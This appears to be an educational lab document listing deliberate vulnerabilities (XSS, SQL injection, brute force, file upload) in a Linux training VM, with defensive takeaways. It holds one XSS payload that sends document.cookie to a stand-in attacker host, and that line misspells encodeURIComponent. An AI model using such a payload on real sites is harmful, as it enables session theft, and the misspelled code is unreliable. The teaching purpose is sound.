# Linux VM Vulnerabilities

This document highlights the deliberate vulnerabilities included in the Linux target VM. Each vulnerability is presented with a detailed explanation, real-world relevance, and educational purpose.

---

## Cross-Site Scripting (XSS)
**Description:** Cross-Site Scripting (XSS) happens when an application includes untrusted user input in pages sent to other users without proper validation or output encoding. Attackers inject client-side code (usually JavaScript) that the victim’s browser executes in the context of the site. Because the code runs in users’ browsers, XSS can steal session tokens, perform actions on behalf of users, display spoofed UI, or be chained with other flaws.   
**Educational Purpose:** Students will exploit stored, reflected, and DOM-based XSS in controlled exercises to learn how payloads execute in victims’ browsers, how data (cookies, localStorage, form values) can be exfiltrated, and how to defend against these attacks via context-aware output encoding, input validation, and Content Security Policy (CSP).  
**Real-World Relevance:** XSS is a long-standing, common web vulnerability (historically in the OWASP Top 10). While it typically targets users rather than servers directly, consequences include account takeover, phishing, and platform abuse. High-profile incidents (e.g., the 2005 MySpace “Samy” worm and the 2014 TweetDeck XSS issue) demonstrate rapid propagation and real impact on large user bases.  

**Example:** A comment field accepts HTML without encoding. An attacker posts:  
'''html
<script>fetch('https://attacker.example/steal?c='+encodedURIComponent(document.cookie))</script>
'''  
When other users load the comment, their browsers execute the script and send session cookies to the attacker, enabling hijack of user accounts.  

---

## SQL Injection
**Description:** SQL injection occurs when user input is improperly sanitized, allowing attackers to manipulate backend database queries.  
**Educational Purpose:** Students will exploit SQL injection to retrieve sensitive information from the database and understand how unsanitized input can be dangerous.  
**Real-World Relevance:** SQL injection remains one of the most common web vulnerabilities. High-profile breaches, including credit card and personal information leaks, often result from SQL injection attacks. Understanding this vulnerability teaches students the importance of parameterized queries, input validation, and secure coding practices.

**Example:** Attackers may enter malicious SQL statements in a login form to bypass authentication or extract sensitive data.  

---

## Brute Force Attack
**Description:** Brute force attacks systematically attempt all possible password combinations to gain unauthorized access.  
**Educational Purpose:** Students will attempt login on weak accounts, gaining insight into why strong, unique passwords are critical.  
**Real-World Relevance:** Weak passwords or default credentials are often the first point of exploitation in server breaches. Organizations such as healthcare providers and small businesses have suffered ransomware or data theft because attackers successfully guessed weak passwords.

**Example:** Using automated tools, an attacker could compromise SSH access by trying thousands of passwords until one succeeds.

---

## File Upload Vulnerability
**Description:** Unrestricted file uploads allow attackers to place malicious files on the server.  
**Educational Purpose:** Students will explore file upload mechanisms and observe how improper validation can lead to remote code execution.  
**Real-World Relevance:** Many content management systems or web applications have suffered from malware installation, website defacement, or full server compromise due to unvalidated file uploads.

**Example:** Uploading a web shell that allows an attacker to execute commands remotely, gain administrative privileges, or pivot to other systems on the network.

---

## Key Takeaways
- Always validate and sanitise user inputs according to the expected context.  
- Apply context-aware output encoding (HTML, attribute, JS, URL).  
- Use parameterised queries / prepared statements for DB access.  
- Enforce strong authentication, rate-limiting, and MFA where practical.  
- Restrict upload types, check file contents, and store uploads outside the web root.  
- Implement security headers (CSP, X-Content-Type-Options) and HttpOnly/Secure cookie flags.  
- Regularly test with automated scanners and manual review; learn to think like an attacker to design better defenses.
